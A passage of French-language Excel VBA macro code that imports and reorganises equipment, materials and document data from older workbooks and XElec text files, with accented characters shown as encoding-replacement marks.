                    .Cells(Rech.row, .Range("DecNomencl").Column).Formula = "O" 'avec Mat|fffd|riels et Documents
                Else
                        'Stop 'Non Trait|fffd|
                End If
                Set Rech = .Columns(.Range("DecNum_SSEN").Column).FindNext(Rech)
            Loop While Not Rech Is Nothing And Rech.Address <> FirstAddress 'Prise en compte des Equipements Multiple
        Else
            'Stop 'Ensemble ou Sous-Ensemble non trouv|fffd| 'Cas |fffd| Analyser
        End If
    End With
    Application.EnableEvents = True
End Function


'V|fffd|rifier s'il reste des Sous-Ensembles sans Materiels dans Decoupage, les transf|fffd|rer dans Materiels
Sub Sous_Ensembles_Decoupage()
    Dim wsDec     As Worksheet
    Dim WsMat     As Worksheet
    Dim Rech      As Object
    Dim Rech2     As Object
    Dim LigneMat  As Long
    Dim LigneDec  As Long
    Dim No_Simon  As String
    Dim Equip_Sup As String

    Application.EnableEvents = False
    Set wsDec = ThisWorkbook.Worksheets(shDecoupage)
    Set WsMat = ThisWorkbook.Worksheets(shMateriels)
    With wsDec
        Do
            Set Rech = .Columns(.Range("DecNiveau").Column).Find(what:="S", LookAt:=xlWhole)
            If Not Rech Is Nothing Then
                LigneDec = Rech.row
                
                'Recherche de l'Equipement Sup|fffd|rieur N+2
                No_Simon = .Cells(LigneDec, .Range("DecPmp").Column).Value
                Set Rech2 = .Columns(.Range("DecNoSimon").Column).Find(what:=No_Simon, LookAt:=xlWhole)
                If Not Rech2 Is Nothing Then
                    Equip_Sup = .Cells(Rech2.row, .Range("DecNum_SSEN").Column).Value
                    'El|fffd|ment Sup|fffd|rieur N+2 Trouv|fffd|
                    'Equipement avec Mat|fffd|riels, Mettre |fffd| jour le Champ Nomenclature
                    If LigneDec <> Rech2.row Then wsDec.Cells(Rech2.row, wsDec.Range("DecNomencl").Column).Formula = "M"                         'Founiture Mat|fffd|riels sans Documents
                Else
                    'Si Non Trouv|fffd| rechercher dans l'onglet Mat|fffd|riels
                    Set Rech2 = WsMat.Columns(WsMat.Range("MatCodePreco").Column).Find(what:=No_Simon, LookAt:=xlWhole)
                    If Not Rech2 Is Nothing Then Equip_Sup = WsMat.Cells(Rech2.row, WsMat.Range("MatRefFournisseur").Column).Value Else Equip_Sup = vbNullString
                End If
                
                'If LigneDec <> Rech2.Row Then 'El|fffd|ment Sup|fffd|rieur N+2 Trouv|fffd|
                    LigneMat = Lastline(WsMat) + 1
                    WsMat.Cells(LigneMat, WsMat.Range("MatNumeroOrdre").Column).Formula = LigneMat
                    Deplacer_Equipement wsDec, LigneDec, WsMat, LigneMat, Equip_Sup

                'Else 'Pas de Pere
                '.Activate
                 '   Stop
                'End If
            End If
        Loop While Not Rech Is Nothing
    End With
    Application.EnableEvents = True
End Sub


Sub Traitement_Ensembles()
    Dim wsDec As Worksheet, WsMat As Worksheet
    Dim LigneDec As Long, LigneMat As Long, lLigneDecMax As Long
    Dim Rech As Object
    Dim Ref_Ens As String
    
    Application.EnableEvents = False
    Set wsDec = ThisWorkbook.Worksheets(shDecoupage)
    Set WsMat = ThisWorkbook.Worksheets(shMateriels)
    With wsDec
        ' Initilisation
        LigneDec = FirstLine(shDecoupage)
        lLigneDecMax = Lastline(wsDec)
        ' Boucle
        Do While LigneDec > lLigneDecMax
            'Recherche des Ensembles
            If .Cells(LigneDec, .Range("DecNiveau").Column).Value = "E" Then
                Ref_Ens = .Cells(LigneDec, .Range("DecNoSimon").Column).Value

                'Ensemble pas encore Transf|fffd|r|fffd| (Articles rattach|fffd|s aux Ensembles)
                Set Rech = WsMat.Columns(WsMat.Range("MatCodePreco").Column).Find(what:=Ref_Ens, LookAt:=xlWhole)
                If Rech Is Nothing Then
                    'Rechercher le premier Sous-Ensemble Fils
                    Set Rech = WsMat.Columns(WsMat.Range("MatMabecSacim").Column).Find(what:=Ref_Ens & "_", LookAt:=xlPart)
                    If Not Rech Is Nothing Then
                        LigneMat = Rech.row
                        'Si Coh|fffd|rence Niveau de Pose, un GE peut |fffd|tre associ|fffd| |fffd| un E
                        If .Cells(LigneDec, .Range("DecNiveauPose").Column).Value = WsMat.Cells(LigneMat, WsMat.Range("MatNiveauFour").Column).Value - 1 Then
                            'Ins|fffd|rer une ligne
                            WsMat.Rows(LigneMat).Insert Shift:=xlDown
                            'Copier les Donn|fffd|es de l'ensemble
                            Deplacer_Equipement wsDec, LigneDec, WsMat, LigneMat, vbNullString
                        End If
                    End If
                End If
            End If
            LigneDec = LigneDec + 1
        Loop
    End With
    Application.EnableEvents = True
End Sub


Sub Eclatement_Suffixes_Purge()
    Dim Rech    As Object
    Dim Pos     As Integer
    Dim Ref     As String
    
    Application.EnableEvents = False
    With ThisWorkbook.Worksheets(shDecoupage)
        Do
            Set Rech = .Columns(.Range("DecNum_SSEN").Column).Find(what:="_", LookAt:=xlPart)
            If Not Rech Is Nothing Then
                Ref = Rech.Value
                Pos = VBA.InStrRev(Ref, "_")
                .Cells(Rech.row, .Range("DecNum_SSEN").Column).Formula = VBA.Mid(Ref, 1, Pos - 1)
                .Cells(Rech.row, .Range("DecSuf_SSEN").Column).Formula = VBA.Mid(Ref, Pos + 1, VBA.Len(Ref))
            End If
        Loop While Not Rech Is Nothing

        'Nettoyer la colonne DecPmp, ayant servie au Stockage de l'|fffd|quipement sup|fffd|rieur
        Pos = .Range("DecPmp").Column
        .Range(.Cells(FirstLine(shDecoupage), Pos), .Cells(.Rows.Count, Pos)).ClearContents
        
        Pos = .Range("DecOrdreTri").Column
        .Range(.Cells(FirstLine(shDecoupage), Pos), .Cells(.Rows.Count, Pos)).ClearContents
    End With
    
    With ThisWorkbook.Worksheets(shMateriels)
        Do
            Set Rech = .Columns(.Range("MatNum_SSEN").Column).Find(what:="_", LookAt:=xlPart)
            If Not Rech Is Nothing Then
                Ref = Rech.Value
                Pos = VBA.InStrRev(Ref, "_")
                .Cells(Rech.row, .Range("MatNum_SSEN").Column).Formula = VBA.Mid(Ref, 1, Pos - 1)
                .Cells(Rech.row, .Range("MatSuf_SSEN").Column).Formula = VBA.Mid(Ref, Pos + 1, VBA.Len(Ref))
            End If
        Loop While Not Rech Is Nothing

        Do
            Set Rech = .Columns(.Range("MatRefFournisseur").Column).Find(what:="_", LookAt:=xlPart)
            If Not Rech Is Nothing Then
                Ref = Rech.Value
                Pos = VBA.InStrRev(Ref, "_")
                .Cells(Rech.row, .Range("MatRefFournisseur").Column).Formula = VBA.Mid(Ref, 1, Pos - 1)
                .Cells(Rech.row, .Range("MatSuffixeReference").Column).Formula = VBA.Mid(Ref, Pos + 1, VBA.Len(Ref))
            End If
        Loop While Not Rech Is Nothing

        'Nettoyer la colonne MatMabecSacim, ayant servie au Stockage de l'|fffd|quipement sup|fffd|rieur
        Pos = .Range("MatMabecSacim").Column
        .Range(.Cells(FirstLine(shMateriels), Pos), .Cells(.Rows.Count, Pos)).ClearContents

        'Nettoyer la colonne MatCodePreco, ayant servie au Stockage du Num|fffd|ro Simon
        Pos = .Range("MatCodePreco").Column
        .Range(.Cells(FirstLine(shMateriels), Pos), .Cells(.Rows.Count, Pos)).ClearContents
    End With

    With ThisWorkbook.Worksheets(shDocuments)
        Do
            Set Rech = .Columns(.Range("DocNum_SSEN").Column).Find(what:="_", LookAt:=xlPart)
            If Not Rech Is Nothing Then
                Ref = Rech.Value
                Pos = VBA.InStrRev(Ref, "_")
                .Cells(Rech.row, .Range("DocNum_SSEN").Column).Formula = VBA.Mid(Ref, 1, Pos - 1)
                .Cells(Rech.row, .Range("DocSuf_SSEN").Column).Formula = VBA.Mid(Ref, Pos + 1, VBA.Len(Ref))
            End If
        Loop While Not Rech Is Nothing

        Do
            Set Rech = .Columns(.Range("DocRefDocument").Column).Find(what:="_", LookAt:=xlPart)
            If Not Rech Is Nothing Then
                Ref = Rech.Value
                Pos = VBA.InStrRev(Ref, "_")
                .Cells(Rech.row, .Range("DocRefDocument").Column).Formula = VBA.Mid(Ref, 1, Pos - 1)
                .Cells(Rech.row, .Range("DocSufDocument").Column).Formula = VBA.Mid(Ref, Pos + 1, VBA.Len(Ref))
            End If
        Loop While Not Rech Is Nothing

        'Nettoyer la colonne ayant servie au Stockage de l'|fffd|quipement sup|fffd|rieur
        Pos = 28
        .Range(.Cells(FirstLine(shDocuments), Pos), .Cells(.Rows.Count, Pos)).ClearContents
    End With
    Application.EnableEvents = True
End Sub
Attribute VB_Name = "C_Import_TDI"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Import de donn|fffd|es d'un ancien TDI
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 21/10/2008
'[Version       : V1.2 du 17/03/2009
'[---------------------------------------------------------------------------
'[Sujet: Import de donn|fffd|es d'un ancien TDI
'[---------------------------------------------------------------------------


Dim PathTdi     As String
Dim NameFileTDI As String


Function Bouton_Importer_TDI()
'Reste |fffd| traiter - Purge du classeur avant import ou rajout de donn|fffd|es
    Dim TypesFiles As String, theTitle As String

    PathTdi = FilesCls.PathWorkBook(ThisWorkbook, False)
    TypesFiles = IniCls.ReadStringIniLangage("MsgFile", "MsgFileTDI")
    theTitle = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportTDI")
    
    'Affichage de la boite des fichiers avec arr|fffd|t si demand|fffd|
    If FilesCls.Openfiles(FilesCls.PathWorkBook(ThisWorkbook, True), TypesFiles, theTitle, PathTdi, NameFileTDI) Then
        frmProgression.FlagAbandon = 0
        frmProgression.lblN|fffd|Traitement = 5
        frmProgression.Show
    End If
End Function


Sub Import_TDI()
    Dim wbSource As Workbook, wbDest As Workbook
    Dim NomFeuille As String, MsgInfo As String
    
    'Empecher l'ex|fffd|cution des Macros du TDI |fffd| importer
    frmProgression.UpdateProgress 0, IniCls.ReadStringIniLangage("MsgFWK", "MsgEnCours"), 0
    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportOnglet")
    
    ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
    GererConfiguration False
    
    If WBooksCls.OpenBook(PathTdi, NameFileTDI, True) Then

        Set wbSource = Workbooks(NameFileTDI)
        
        If Not Verifie_Structure_Import(wbSource) Then MsgCls.ShowMessage "MsgDefautStructure", vbNullString, vbNullString, vbNullString, vbOKOnly + vbCritical: End
        
        
        'Nouveau_TDI_Selon_Modele
        Set wbDest = ThisWorkbook 'ActiveWorkbook
        If frmProgression.FlagAbandon = 0 Then
            frmProgression.UpdateProgress 0 / 7, MsgInfo & " : " & ShAffaire, frmProgression.FlagAbandon
            If SheetCls.Sheet_Exist(wbSource, ShAffaire) Then Import_Affaire wbSource.Worksheets(ShAffaire), wbDest.Worksheets(ShAffaire)
        End If
        
        If frmProgression.FlagAbandon = 0 Then
            frmProgression.UpdateProgress 1 / 7, MsgInfo & " : " & shDecoupage, frmProgression.FlagAbandon
            NomFeuille = Nom_Feuille_Import(wbSource, shDecoupage) 'D|fffd|coupage ou Decoupage, Accents dans ancienne version
            Purge_Data shDecoupage
            If SheetCls.Sheet_Exist(wbSource, NomFeuille) Then Import_Decoupage wbSource.Worksheets(NomFeuille), wbDest.Worksheets(shDecoupage)
        End If
        
        If frmProgression.FlagAbandon = 0 Then
            frmProgression.UpdateProgress 2 / 7, MsgInfo & " : " & shMateriels, frmProgression.FlagAbandon
            NomFeuille = Nom_Feuille_Import(wbSource, shMateriels) 'Mat|fffd|riels ou Materiels, Accents dans ancienne version
            Purge_Data shMateriels
            If SheetCls.Sheet_Exist(wbSource, NomFeuille) Then Import_Materiels wbSource.Worksheets(NomFeuille), wbDest.Worksheets(shMateriels)
        End If
        
        If frmProgression.FlagAbandon = 0 Then
            frmProgression.UpdateProgress 3 / 7, MsgInfo & " : " & shDocuments, frmProgression.FlagAbandon
            Purge_Data shDocuments
            If SheetCls.Sheet_Exist(wbSource, shDocuments) Then Import_Documents wbSource.Worksheets(shDocuments), wbDest.Worksheets(shDocuments)
        End If
        
        If frmProgression.FlagAbandon = 0 Then
            frmProgression.UpdateProgress 4 / 7, MsgInfo & " : " & shCtrl_Ged, frmProgression.FlagAbandon
            Purge_Data shCtrl_Ged
            If SheetCls.Sheet_Exist(wbSource, shCtrl_Ged) Then Import_Ctrl_Ged wbSource.Worksheets(shCtrl_Ged), wbDest.Worksheets(shCtrl_Ged)
            Purge_Data shCSV     'L'onglet CSV n'est pas import|fffd|
        End If
        
        If frmProgression.FlagAbandon = 0 Then
            frmProgression.UpdateProgress 5 / 7, MsgInfo & " : " & shPieces_Rechange, frmProgression.FlagAbandon
            Purge_Data shPieces_Rechange
            If SheetCls.Sheet_Exist(wbSource, shPieces_Rechange) Then Import_Pieces_Rechange wbSource.Worksheets(shPieces_Rechange), wbDest.Worksheets(shPieces_Rechange)
        End If
                
        frmProgression.UpdateProgress 7 / 7, MsgInfo, frmProgression.FlagAbandon
        wbDest.Worksheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
        'wbDest.Worksheets(Affaire).Range("Champ_Analyse_Donnees").Value = "N"
        wbDest.Worksheets(ShAffaire).Range("Champ_Mise_En_Forme").Value = "O"
        wbDest.Worksheets(ShAffaire).Range("Champ_Suivi_Modifications").Value = "O"
        
        'Affiche_Decoupage
        WBooksCls.CloseWorkbook NameFileTDI, False ' sans sauvegarde

        If frmProgression.FlagAbandon = 0 Then
            Bouton_Affiche_Decoupage
            frmProgression.UpdateProgress 1, IniCls.ReadStringIniLangage("MsgFWK", "MsgTermine"), 0
        Else
            Purge_TDI False
        End If

    End If
    ' On active tout ce qui doit l'|fffd|tre
    GererConfiguration True
    
End Sub


Sub Import_Affaire(wsSource As Worksheet, wsDest As Worksheet)
    Const Col_Source = 5
    Dim LastLigne As Long, Ligne As Long, LigneDest As Long

    If wsSource.FilterMode Then wsSource.ShowAllData
    
    With wsDest
        .Range("Champ_Fournisseur").Value = wsSource.Cells(2, Col_Source).Value 'Nom_four
        .Range("Champ_Affaire").Value = wsSource.Cells(3, Col_Source).Value 'Val_Affaire
        .Range("Champ_Analyse_Dynamique").Value = "N"
        .Range("Champ_Analyse_Donnees").Value = "N"
        .Range("Champ_Mise_En_Forme").Value = "N"
        .Range("Champ_Suivi_Modifications").Value = "N"
        .Range("Champ_Division").Value = wsSource.Cells(7, Col_Source).Value 'Division
        .Range("Champ_Metier").Value = wsSource.Cells(8, Col_Source).Value 'metier
        .Range("Champ_Resp_Fournisseur").Value = wsSource.Cells(15, Col_Source).Value 'resp_aff_four
        .Range("Champ_Resp_Documentaire").Value = wsSource.Cells(16, Col_Source).Value 'resp_etude_four
        .Range("Champ_Tel_Resp_Fournisseur").Value = wsSource.Cells(17, Col_Source).Value 'resp_doc_four
        .Range("Champ_Resp_Renault").Value = wsSource.Cells(18, Col_Source).Value 'resp_aff_ren
        .Range("Champ_Resp_Doc_Renault").Value = wsSource.Cells(19, Col_Source).Value 'resp_doc_ren
        .Range("Champ_Tel_Renault").Value = wsSource.Cells(20, Col_Source).Value 'pilote_maint
        .Range("Champ_Date_Fin_Etude").Value = wsSource.Cells(21, Col_Source).Value 'date_atfe
        .Range("Champ_Date_Decoupage").Value = wsSource.Cells(22, Col_Source).Value 'date_val_dec
        .Range("Champ_Num_Mabec").Value = wsSource.Cells(23, Col_Source).Value 'Num_inv_pere
        'Purge Historique
        .Rows("29:" & wsDest.Rows.Count).Delete
        .Rows("29:" & wsDest.Rows.Count).NumberFormat = "@"
        
        'Attention dans les anciennes versions de TDI, les colonnes ne sont pas nomm|fffd|es
        LastLigne = SheetCls.LastLineColumn(wsSource, 1)
        If SheetCls.LastLineColumn(wsSource, 3) > LastLigne Then LastLigne = SheetCls.LastLineColumn(wsSource, 3)
    
        'Recopie des Lignes Non Vide
        LigneDest = wsDest.Range("Debut_Suivi_Modifications").row
        Ligne = 29
        Do Until Ligne > LastLigne
            If wsSource.Cells(Ligne, 11).End(xlToLeft).Column > 1 Then
                LigneDest = LigneDest + 1
                wsSource.Range("A" & Ligne & ":J" & Ligne).Copy Destination:=.Range("A" & LigneDest)
    '            wsDest.Range("A" & LigneDest).PasteSpecial 'Special Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
                Application.CutCopyMode = False
                frmProgression.UpdateProgress Ligne / LastLigne, "Nettoyage Historique de l'onglet " & " : " & ShAffaire, frmProgression.FlagAbandon
            End If
            Ligne = Ligne + 1
        Loop
        
        'Attention dans les anciennes versions de TDI, les colonnes ne sont pas nomm|fffd|es
        LastLigne = SheetCls.LastLineColumn(wsSource, 16)
        wsSource.Range("P28:U" & LastLigne).Sort Key1:=wsSource.Range("P28"), Order1:=xlAscending, Header:=xlYes, _
            OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, DataOption1:=xlSortTextAsNumbers
        wsSource.Range("P29:U" & LastLigne).Copy Destination:=.Range("P" & wsDest.Range("Debut_Suivi_Modifications").row + 1)
'        wsDest.Range("P" & wsDest.Range("Debut_Suivi_Modifications").row + 1).PasteSpecial 'Special Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
        Application.CutCopyMode = False
        
        .Cells(wsDest.Range("Debut_Suivi_Modifications").row + 1, 15).Value = SheetCls.LastLineColumn(wsDest, 16)
    End With
End Sub


Sub Import_Decoupage(wsSource As Worksheet, wsDest As Worksheet)
    Dim LastLigne As Long, LigneDest As Long

    If wsSource.FilterMode Then wsSource.ShowAllData

    'Attention dans les anciennes versions de TDI, les colonnes ne sont pas nomm|fffd|es
    LastLigne = Lastline(wsSource)
    LigneDest = FirstLine(shDecoupage)
    If LastLigne >= LigneDest Then
        With wsDest
            wsSource.Range("A" & 4 & ":AV" & LastLigne).Copy
            .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
            .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
        End With
        Application.CutCopyMode = False
    End If
End Sub


Sub Import_Materiels(wsSource As Worksheet, wsDest As Worksheet)
    Dim LastLigne As Long, LigneDest As Long

    If wsSource.FilterMode Then wsSource.ShowAllData
    
    'Attention dans les anciennes versions de TDI, les colonnes ne sont pas nomm|fffd|es
    LastLigne = Lastline(wsSource)
    LigneDest = FirstLine(shMateriels)
    If LastLigne >= LigneDest Then
        With wsDest
            wsSource.Range("A" & 4 & ":AA" & LastLigne).Copy
            .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
            .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
        End With
        Application.CutCopyMode = False
    End If
End Sub


Sub Import_Documents(wsSource As Worksheet, wsDest As Worksheet)
    Dim LastLigne As Long, LigneDest As Long

    If wsSource.FilterMode Then wsSource.ShowAllData
    
    'Attention dans les anciennes versions de TDI, les colonnes ne sont pas nomm|fffd|es
    LastLigne = Lastline(wsSource)
    LigneDest = FirstLine(shDocuments)
    If LastLigne >= LigneDest Then
        With wsDest
            wsSource.Range("A" & 4 & ":AA" & LastLigne).Copy
            .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
            .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
        End With
        Application.CutCopyMode = False
    End If
End Sub


Sub Import_Pieces_Rechange(wsSource As Worksheet, wsDest As Worksheet)
    Dim LastLigne As Long, LigneDest As Long

    If wsSource.FilterMode Then wsSource.ShowAllData
    
    'Ligne_Entete_PR
    With wsDest
        .Range("Site_PR").Value = wsSource.Cells(3, 4).Value 'Site
        .Range("Fournisseur_PR").Value = wsSource.Cells(3, 13).Value 'Fournisseur
        .Range("Projet_PR").Value = wsSource.Cells(3, 8).Value 'Projet
        .Range("Perimetre_PR").Value = wsSource.Cells(4, 9).Value 'Perimetre de la liste
        .Range("NumDCM_PR").Value = wsSource.Cells(4, 56).Value 'Num|fffd|ro DCM
        .Range("NumDPG_PR").Value = wsSource.Cells(4, 66).Value 'Num|fffd|ro DPG

        'Attention dans les anciennes versions de TDI, les colonnes ne sont pas nomm|fffd|es
        LastLigne = Lastline(wsSource)
        LigneDest = .Range("PRLigneEntete").row + 4
    
        If LastLigne >= LigneDest Then
            wsSource.Range("A" & 6 & ":DX" & LastLigne).Copy
            .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
            .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
            Application.CutCopyMode = False
        
            With .Range("A" & .Range("PRLigneEntete").row + 4 & ":DX" & LigneDest - 1)
                .HorizontalAlignment = xlGeneral
                .VerticalAlignment = xlCenter
                .WrapText = True
                .Orientation = 0
                .AddIndent = False
                .IndentLevel = 0
                .ShrinkToFit = False
                .ReadingOrder = xlContext
                .MergeCells = False
            End With
        End If
    End With
End Sub


Sub Import_Ctrl_Ged(wsSource As Worksheet, wsDest As Worksheet)
    Dim LastLigne As Long, LigneDest As Long

    If wsSource.FilterMode Then wsSource.ShowAllData
    'Attention dans les anciennes versions de TDI, les colonnes ne sont pas nomm|fffd|es
    LastLigne = Lastline(wsSource)
    If LastLigne = 0 Then Exit Sub
    LigneDest = 1
    With wsDest
        wsSource.Rows("1:" & LastLigne).Copy
        .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
        .Cells(LigneDest, 1).PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
    End With
    Application.CutCopyMode = False
End Sub


'Chargement de la liste Pi|fffd|ces de Rechange si celle-ci est vide, ACH, Enlev|fffd| le 17/03/2009
'Sub Traitement_Pieces_Rechange(wbSource As Workbook) 'wsSource As Worksheet, wsDest As Worksheet)
'    Dim WsPiecesRechange As Worksheet
'    Dim WsAffaire        As Worksheet
'
'    Dim NbLignesPR       As Long
'    Dim ligne            As Long
'
'    'G|fffd|n|fffd|ration de la liste PR dans le TDI
'    Set WsPiecesRechange = wbSource.Worksheets(shPieces_Rechange)
'    If WsPiecesRechange.Cells(6, 44).Value = vbnullstring Then
'
'        'Init Nombre Lignes sur l'interface Nomenclature
'        'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 3).Value = 0
'        'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = 0
'        'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 3).Value = 0
'
'        ' Charge la liste en Pi|fffd|ce de rechange
'        nb_element = 0
'        nb_ligne_element = 0
'        Init_var_PR WsPiecesRechange
'        Set WsAffaire = wbSource.Worksheets(ShAffaire)
'
'        'Attention dans les anciennes versions de TDI, les colonnes ne sont pas nomm|fffd|es
'        NbLignesPR = Lastline(wbSource.Worksheets(shPieces_Rechange))
'
'        Num_ssen_PR = WsAffaire.Cells(23, 5).Value
'        For ligne = 6 To NbLignesPR
'            Lire_PR WsPiecesRechange, ligne
'            qte = 0
'            If Num_ssen_PR <> "*" Then
'                tab_qte(nb_element + 1) = qte
'                tab_article(nb_element + 1) = vbnullstring
'                tab_ind(nb_element + 1) = 0
'
'                If Exist_PdR_1(Cle_Art_PR) Then
'                    WsPiecesRechange.Cells(ligne, P_Rapproche_PR).Value = "Doublon"
'                Else
'                    WsPiecesRechange.Cells(ligne, P_Rapproche_PR).Value = "No_TDI"
'                    nb_element = nb_element + 1
'                    nb_ligne_element = nb_element
'                    WsPiecesRechange.Cells(ligne, P_Date_enrich_PR).Value = VBA.Date
'                    tab_qte(nb_element) = qte
'                    tab_article(nb_element) = Cle_Art_PR
'                    tab_ind(nb_element) = ligne
'                End If
'            End If
'            nb_ligne_element = NbLignesPR
'
'            'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = Ligne - 4 'Nombre de Lignes de Mat|fffd|riels
'
'        Next ligne
'        nb_element = nb_element
'
'        'ThisWorkbook.Sheets(shCde_Nomenclature).Cells(18, 7).Value = Date & " - " & Time'Mise |fffd| Jour Date Traitement
'
'        Charge_Mat WsPiecesRechange
'    End If
'End Sub
Attribute VB_Name = "C_Import_Xelec"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Import des Donn|fffd|es XElec
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 01/10/2008
'[Version       : V1.0 du 01/10/2008
'[---------------------------------------------------------------------------
'[Sujet: Import des Donn|fffd|es XElec
'[---------------------------------------------------------------------------

'Pr|fffd|voir Fonctionnalit|fffd| Fusion de Donn|fffd|es ou Ecrasement de Donn|fffd|es

    'Comptage Anomalies
    Dim design_err   As Integer
    Dim ref_fab_err  As Integer
    Dim nom_fab_err  As Integer
    
    Dim val_suf      As Integer 'Indice Suffixe
    Dim mem_note     As String  'Enveloppe Rep|fffd|re en Cours
    Dim data_xelec   As String  'Enregistrement Xelec

    'Donn|fffd|es article
    Dim num_ssen     As String
    Dim suf_ssen     As String
    Dim SACIMMABEC   As String
    Dim Repere       As String
    Dim Design       As String
    Dim ref_fab      As String
    Dim nom_fab      As String
    Dim Qte          As Integer
    Dim piece_rech   As String
    Dim Note         As String
    Dim NATURE       As String
    Dim Tech         As String
    Dim Obs          As String


Private Sub Bouton_Import_Xelec()
    num_ssen = VBA.UCase(Trim(Worksheets(ShAffaire).Range("Champ_Num_Mabec").Value))
    If num_ssen = vbNullString Then
        ThisWorkbook.Worksheets(ShAffaire).Activate
        ThisWorkbook.Worksheets(ShAffaire).Range("Champ_Num_Mabec").Select
        MsgCls.ShowMessage "MsgDocInventaire", vbNullString, vbNullString, vbNullString, vbOKOnly + vbCritical
    Else
        frmImportXelec.Show
    End If
End Sub


Sub Import_Nomenclature_Xelec(Regroup As Byte)
    Ouverture_Fichier_Xelec Regroup
End Sub


Sub Initialisation()
    design_err = 0
    ref_fab_err = 0
    nom_fab_err = 0
    val_suf = 0
    mem_note = vbNullString
End Sub


Sub Ouverture_Fichier_Xelec(Regroup As Byte)
    Dim PathXelec As String, TypesFiles As String, theTitle As String, XelecFile As String
    Dim Ligne_Debut As Long

    PathXelec = FilesCls.PathWorkBook(ThisWorkbook, False)
    TypesFiles = IniCls.ReadStringIniLangage("MsgFile", "MsgFileXelec")
    theTitle = IniCls.ReadStringIniLangage("MsgFWK", "MsgImportXelec")
    
    'Affichage de la boite des fichiers avec arr|fffd|t si demand|fffd|
    If FilesCls.Openfiles(FilesCls.PathWorkBook(ThisWorkbook, True), TypesFiles, theTitle, PathXelec, XelecFile) Then
        If VBA.Len(Dir(XelecFile)) > 0 Then
            frmImportXelec.txtDesignErr = 0
            frmImportXelec.txtRefFabErr = 0
            frmImportXelec.txtNomFabErr = 0
            'Ouvre le fichier en lecture
            Open XelecFile For Input As #1
            Suppression_Filtres
            'Purge ou Rajout de Donn|fffd|es sur un TDI existant
            If frmImportXelec.optPurge.Value Then Purge_Data shMateriels: Ligne_Debut = FirstLine(shMateriels) Else Ligne_Debut = Lastline(ThisWorkbook.Worksheets(shMateriels)) + 1
            Charge_Article_Xelec Ligne_Debut, Regroup
        End If
    End If
End Sub


Sub Charge_Article_Xelec(Ligne_Debut As Long, Regroup As Byte)
    Dim Ligne_Tdi As Long
    
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    Initialisation
    
    frmImportXelec.lblFinImport.Visible = True
    frmImportXelec.lblFinImport.Caption = IniCls.ReadStringIniLangage("MsgFWK", "MsgEnCours")
    frmImportXelec.Repaint
    
    Ligne_Tdi = Ligne_Debut
    Do While Not EOF(1)
        Line Input #1, data_xelec
        'Debug.Print data_xelec
        If VBA.Len(data_xelec) > 10 Then
            Lire_data
            If mem_note <> Note Then
                'Cr|fffd|ation d'un Sous-Ensemble sur Changement d'Enveloppe Repere
                val_suf = val_suf + 1
                mem_note = Note
                If val_suf < 10 Then suf_ssen = "NE0" + VBA.Right(CStr(val_suf), 1) Else suf_ssen = "NE" + VBA.Right(CStr(val_suf), 2)
                
                With ThisWorkbook.Sheets(shMateriels)
                    .Cells(Ligne_Tdi, .Range("MatNumeroOrdre").Column).Value = Ligne_Tdi - Ligne_Debut + 1
                    .Cells(Ligne_Tdi, .Range("MatNum_SSEN").Column).Value = num_ssen
                    .Cells(Ligne_Tdi, .Range("MatSuf_SSEN").Column).Value = vbNullString 'suf_ssen
                    .Cells(Ligne_Tdi, .Range("MatNiveauFour").Column).Value = vbNullString
                    .Cells(Ligne_Tdi, .Range("MatNiveau").Column).Value = "S"
                    .Cells(Ligne_Tdi, .Range("MatNature").Column).Value = "C"
                    .Cells(Ligne_Tdi, .Range("MatRefFournisseur").Column).Value = num_ssen
                    .Cells(Ligne_Tdi, .Range("MatSuffixeReference").Column).Value = suf_ssen
                    .Cells(Ligne_Tdi, .Range("MatNomFournisseur").Column).Value = "RENAULT"
                    .Cells(Ligne_Tdi, .Range("MatDesignation").Column).Value = "ENVELOPPE REPERE : " + Note
                    .Cells(Ligne_Tdi, .Range("MatQuantite").Column).Value = 1
                    .Cells(Ligne_Tdi, .Range("MatPieceRechange").Column).Value = "N"
                    .Cells(Ligne_Tdi, .Range("MatDocument").Column).Value = "SP"
                    .Cells(Ligne_Tdi, .Range("MatDateModif").Column).Value = Date
                    .Cells(Ligne_Tdi, .Range("MatTechnologie").Column).Value = "E"
                End With
                
                Ligne_Tdi = Ligne_Tdi + 1
            End If
            
            Ecriture_Article_TDI Ligne_Tdi, Ligne_Tdi - Ligne_Debut + 1
            frmImportXelec.txtNbElement = Ligne_Tdi - Ligne_Debut
        End If
    Loop
    Close #1    'Ferme le fichier.
    
    If Regroup = 1 Then
